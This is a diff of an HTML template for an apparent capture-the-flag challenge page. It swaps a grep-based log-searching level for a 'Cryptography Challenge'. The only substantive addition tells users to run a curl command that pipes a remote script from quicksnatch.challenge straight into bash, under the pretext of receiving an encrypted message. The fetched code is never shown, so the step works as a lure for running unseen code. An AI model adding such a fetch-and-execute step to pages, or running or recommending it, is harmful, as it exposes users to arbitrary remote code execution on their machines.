@@ -1,24 +1,9 @@
 {% extends "challenges/level_base.html" %}
 
-{% block level_title %}Log Explorer Challenge{% endblock %}
+{% block level_title %}Cryptography Challenge{% endblock %}
 
 {% block challenge_description %}
-<div class="challenge-description">
-    <h4>Finding Patterns in Logs</h4>
-    <p>Your task is to search through various log files to find a hidden flag. You'll need to use the grep command effectively.</p>
-    
-    <div class="task-list">
-        <h5>Your Tasks:</h5>
-        <ul>
-            <li>Navigate through the logs directory</li>
-            <li>Examine different types of log files (error.log, access.log, debug.log)</li>
-            <li>Use <code>grep</code> to search for the flag pattern</li>
-            <li>Try recursive search with <code>grep -r</code></li>
-        </ul>
-    </div>
-
-    <div class="hint-box">
-        <p><strong>Hint:</strong> The flag might appear in multiple log files. Use <code>grep -r</code> to search recursively through all files in a directory.</p>
-    </div>
-</div>
+<p>Level 3 tests your cryptography skills. Execute the command below to receive an encrypted message containing the flag.</p>
 {% endblock %}
+
+{% block curl_command %}curl -s https://quicksnatch.challenge/level3/crypto | bash{% endblock %}
